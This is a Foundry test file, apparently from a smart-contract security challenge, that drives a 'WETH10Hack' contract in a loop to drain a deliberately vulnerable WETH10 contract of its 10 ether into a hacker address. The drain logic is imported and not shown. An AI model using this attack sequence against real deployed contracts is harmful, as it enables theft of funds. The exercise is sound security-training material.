pragma solidity ^0.8.0;

import "forge-std/Test.sol";

import { WETH10, WETH10Hack } from "../../src/weth-10/weth-10.sol";

contract Weth10Test is Test {
    WETH10 public weth10;
    WETH10Hack public weth10Hack;

    address hacker;

    function setUp() public {
        weth10 = new WETH10();
        weth10Hack = new WETH10Hack();
        hacker = makeAddr("hacker");

        vm.deal(address(weth10), 10 ether);
        vm.deal(address(hacker), 1 ether);
    }

    function testWETH10Hack() public {
        assertEq(
            address(weth10).balance,
            10 ether,
            "weth contract should have 10 ether"
        );

        vm.startPrank(hacker, hacker);

        // Hacker has 1 WETH10 token
        weth10.deposit{value: 1 ether}();
        assertEq(weth10.balanceOf(hacker), 1 ether);

        // Hacker approves weth10Hack contract for 10 WETH10 tokens
        weth10.approve(address(weth10Hack), 11 ether);

        for (uint256 i = 0; i < 11; i++) {
            // Start hack to get one ether
            weth10Hack.hack(weth10);
        }

        vm.stopPrank();

        assertEq(address(weth10).balance, 0, "empty weth contract");
        assertEq(hacker.balance, 11 ether, "player should end with 11 ether");
    }
}
